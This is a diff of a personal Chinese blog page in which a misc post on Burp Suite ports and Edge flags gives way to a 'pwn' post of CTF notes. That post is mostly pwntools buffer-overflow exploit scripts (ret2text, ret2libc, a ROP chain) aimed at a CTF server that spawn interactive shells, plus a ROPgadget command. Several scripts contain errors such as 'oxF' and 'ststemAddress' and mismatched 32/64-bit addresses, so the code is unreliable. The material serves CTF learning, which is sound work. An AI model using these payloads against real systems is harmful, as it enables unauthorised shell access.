@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      杂项 | zzysu_blog
+       | zzysu_blog
     
   </title>
   <meta name="author" content="yzz">
@@ -100,7 +100,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「杂项」
+			「」
 		
 	</p>
 
@@ -242,10 +242,6 @@
 	<div id="layout-post">
 		<div class="article-title">
 			
-	<a href="/2024/03/18/%E6%9D%82%E9%A1%B9/" itemprop="url">
-		杂项
-	</a>
-
 		</div>
 
 		<div class="article-meta">
@@ -259,9 +255,9 @@
 
 	更新于
 
-	<a href="/2024/03/18/%E6%9D%82%E9%A1%B9/" itemprop="url">
-		<time datetime="2024-03-18T00:56:35.147Z" itemprop="dateUpdated">
-	  		2024-03-17
+	<a href="/2024/03/18/pwn/" itemprop="url">
+		<time datetime="2024-03-18T06:47:42.980Z" itemprop="dateUpdated">
+	  		2024-03-18
 	  </time>
 	</a> 
 
@@ -279,21 +275,34 @@
 		</div>
 
 		<div class="article-content" id="article-content">
-			<!-- toc -->
+			<h1><span id="pwn">pwn</span></h1><h1><span id="简单的python攻击程序">简单的python攻击程序</span></h1><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看几位程序和保护机制</span><br><span class="line">check 附件</span><br></pre></td></tr></table></figure>
 
-<h1 id="burpsuit"><a href="#burpsuit" class="headerlink" title="burpsuit"></a>burpsuit</h1><h2 id="端口占用"><a href="#端口占用" class="headerlink" title="端口占用"></a>端口占用</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">yzz</span>&gt;<span class="title">netstat</span> -<span class="title">aon</span> | <span class="title">findstr</span> :8080</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:8080           0.0.0.0:0              <span class="title">LISTENING</span>       11056</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">yzz</span>&gt;<span class="title">tasklist</span> | <span class="title">findstr</span> 11056</span></span><br><span class="line"><span class="function"><span class="title">ApplicationWebServer.exe</span>     11056 <span class="title">Services</span>                   0     19,608 <span class="title">K</span></span></span><br></pre></td></tr></table></figure>
 
-<p>用任务栏管理器搜索ApplicationWebServer.exe,关闭即可</p>
-<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="路径选择"><a href="#路径选择" class="headerlink" title="路径选择"></a>路径选择</h2><p>c盘的路径才是有效路径</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">yzz</span>\<span class="title">AppData</span>\<span class="title">Local</span>\<span class="title">Programs</span>\<span class="title">Python</span>\<span class="title">Python312</span></span></span><br></pre></td></tr></table></figure>
 
-<h2 id="使用的不是守支持的命令行标记extensions"><a href="#使用的不是守支持的命令行标记extensions" class="headerlink" title="使用的不是守支持的命令行标记extensions"></a>使用的不是守支持的<a href="https://so.csdn.net/so/search?q=%E5%91%BD%E4%BB%A4%E8%A1%8C&spm=1001.2101.3001.7020">命令行</a>标记extensions</h2><p>2024&#x2F;03&#x2F;15</p>
-<h2 id="1-打开网址-edge-flags"><a href="#1-打开网址-edge-flags" class="headerlink" title="1.打开网址: edge:&#x2F;&#x2F;flags&#x2F;"></a>1.打开网址: edge:&#x2F;&#x2F;flags&#x2F;</h2><h2 id="2-搜索框搜索-Extensions-on-edge-URLs"><a href="#2-搜索框搜索-Extensions-on-edge-URLs" class="headerlink" title="2.搜索框搜索 Extensions on edge:&#x2F;&#x2F; URLs"></a>2.搜索框搜索 Extensions on edge:&#x2F;&#x2F; URLs</h2><p><img src="/..%5Cimg%5C2f86aaeec36d4d99a1b26c7d1bb839c5.png" alt="img"></p>
-<p><img src="/..%5Cimg%5C2.png" alt="2"></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/9bf6317a714f418fbd4891690a6f8373.png" alt="img"></p>
-<h2 id="3-改为禁用"><a href="#3-改为禁用" class="headerlink" title="3.改为禁用"></a>3.改为禁用</h2><p><a href="https://answers.microsoft.com/zh-hans/microsoftedge/forum/all/%E8%A7%A3%E5%86%B3%E4%BD%A0%E4%BD%BF%E7%94%A8/9d0c45ca-fb8d-410d-bf86-0b7a3c5c3ead">【解决】你使用的是不受支持的命令行标记：–extensions-on-edge-urls。这会带来稳定性和安全风险。 - Microsoft Community</a></p>
-<h1 id="停止eage自动更新"><a href="#停止eage自动更新" class="headerlink" title="停止eage自动更新"></a>停止eage自动更新</h1><p>找到eage路径,修改名字(MicrosoftEdgeUpdate.exe和EdgeUpdate文件夹&amp;spm&#x3D;1001.2101.3001.7020)),即可</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/9bf6317a714f418fbd4891690a6f8373.png" alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">42045</span>)</span><br><span class="line"><span class="comment">#填充字符,获得system,b是以二进制的方式,int16是4位,13是数组长度</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>*<span class="number">4</span>+p32(<span class="number">17</span>)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">42045</span>)</span><br><span class="line"><span class="comment">#64位程序,要得到system即fun的首地址</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(oxF)+p64(<span class="number">0x401186</span>)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">49035</span>)</span><br><span class="line"><span class="comment">#-1视为无穷大</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;your name:&quot;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"><span class="comment">#填充字符,获得system</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(<span class="number">0x4006E6</span>)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">49035</span>)</span><br><span class="line">systemAddress=<span class="number">0x08048320</span></span><br><span class="line">shellAddress=<span class="number">0x0804A024</span></span><br><span class="line"><span class="comment">#填充字符,拼接system和bin/sh获得system</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(ststemAddress)+p32(<span class="number">0x0</span>)+p32(shellAddress)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>获取寄存器地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only &quot;pop|rdi|ret&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">49035</span>)</span><br><span class="line">systemAddress=<span class="number">0x08048320</span></span><br><span class="line">shellAddress=<span class="number">0x0804A024</span></span><br><span class="line">rdi=<span class="number">0x400683</span></span><br><span class="line"><span class="comment">#填充字符,拼接system和bin/sh获得system</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(rdi)+p64(ststemAddress)+p64(shellAddress)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1><span id="payload构造">payload构造</span></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.get(),read(),scanf()为溢出的切入口</span><br><span class="line">2.查看system()地址</span><br><span class="line">	a.start后面的内容</span><br><span class="line">	b.push地址</span><br><span class="line">3.装满后64&gt;8,32&gt;4</span><br><span class="line">4.栈溢出的功能:</span><br><span class="line">	a.获取到system()</span><br><span class="line">	b.改变变量的值</span><br></pre></td></tr></table></figure>
+
+<h1><span id="例题解析">例题解析</span></h1><h2><span id="2022zjnubabyrop">2022zjnubabyrop</span></h2><p>[<a href="https://ctf.a1natas.com/games/1/challenges">复现] 2022 第二届浙江师范大学网络与信息安全竞赛 - A1::CTF (a1natas.com)</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接服务器,64位程序</span></span><br><span class="line">p=remote(<span class="string">&quot;150.158.160.64&quot;</span>,<span class="number">42045</span>)</span><br><span class="line"><span class="comment">#填充字符,获得system</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(<span class="number">0x401196</span>)</span><br><span class="line"><span class="comment">#发送攻击</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#程序交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 	
 		</div>
 		
@@ -312,12 +321,8 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
-			<a href="/2024/03/18/web/" title="web" rel="prev">
-				&laquo;上一篇
-			</a>
 		
-		
-			<a href="/2024/03/18/hello-world/" title="Hello World" rel="next">
+			<a href="/2024/03/18/hexo/" title="hexo" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -335,32 +340,6 @@
 <div class="relate-post">
 	
 		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/03/18/pwn/" title="">
-											
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								三月 18日, 2024				
-							</p>
-							<p class="relate-post-content">
-								pwn简单的python攻击程序12#查看几位程序和保护机制check 附件
-
-
-
-123456789from pwn import *#连接服务器p=remote(&quot;150.158.160.64&quot;,42045)#...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/03/18/pwn/" title="">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt=""/>
-							</a>
-						</div>
-					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -416,6 +395,30 @@ PHP_UNSERIALIZE ( 2 )🤩敲门砖-带你入门 CTF - A1::CTF (a1natas.com)
 							<a href="/2024/03/18/web/" title="web">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="web"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/18/%E6%9D%82%E9%A1%B9/" title="杂项">
+								杂项			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 18日, 2024				
+							</p>
+							<p class="relate-post-content">
+								
+
+burpsuit端口占用1234C:\Users\yzz&gt;netstat -aon | findstr :8080  TCP    0.0.0.0:8080           0.0.0.0:0              ...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/18/%E6%9D%82%E9%A1%B9/" title="杂项">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="杂项"/>
 							</a>
 						</div>
 					</li>												
